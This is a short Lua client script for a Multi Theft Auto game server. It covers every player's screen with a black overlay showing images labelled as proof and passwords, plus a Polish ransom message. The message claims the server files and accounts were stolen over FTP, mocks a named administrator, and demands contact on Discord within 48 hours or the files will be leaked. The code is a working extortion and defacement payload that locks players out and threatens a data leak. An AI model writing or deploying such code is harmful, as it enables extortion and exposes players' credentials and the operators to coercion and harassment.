local sx, sy = guiGetScreenSize()
local medium = dxCreateFont('Inter-Medium.ttf', 12)
local bold = dxCreateFont('Inter-Bold.ttf', 40)
local bold2 = dxCreateFont('Inter-Bold.ttf', 12)

addEventHandler('onClientRender', root, function()
    -- if is console open, return;
    -- if isConsoleActive() then return end
    dxDrawRectangle(0, 0, sx, sy, 0xFF000000, true)

    dxDrawImage(sx - 950, sy - 700, 900, 650, 'dowod.png', 0, 0, 0, tocolor(255, 255, 255, 255), true)
    dxDrawImage(25, 200, 350, 50, 'hasla.png', 0, 0, 0, tocolor(255, 255, 255, 255), true)

    dxDrawText('UWAGA!', 25, 25, nil, nil, 0xFFFF0000, 1, bold, 'left', 'top', false, false, true)
    dxDrawText('Cała paczka została pobrana z FTP\nposiadamy wszystkie pliki, mapy, konta\n#ff0000graczu, twoje hasło nie jest bezpieczne, administracja serwera ma\ngdzieś twoje bezpieczeństwo i nie używa żadnego kodowania#ffffff, żeby cie chronić, dowód:\n\n\n\n\npomidor to dzieciak który banuje ludzi bez żadnego powodu\nbanuje ludzi za pisanie w złym języku gdy sam to robi\n\n#ff0000do administracji:#ffffff\nmacie #ff000048 godzin#ffffff aby wykupić serwer\njeżeli w tym czasie nie skontaktujesz się na discordzie z #ff0000@borsuczyna#ffffff,\npaczka trafi na gtao.pl\n\n\n\n\nDowód posiadania przez nas paczki ->', 25, 95, nil, nil, 0xFFFFFFFF, 1, medium, 'left', 'top', false, false, true, true)
end)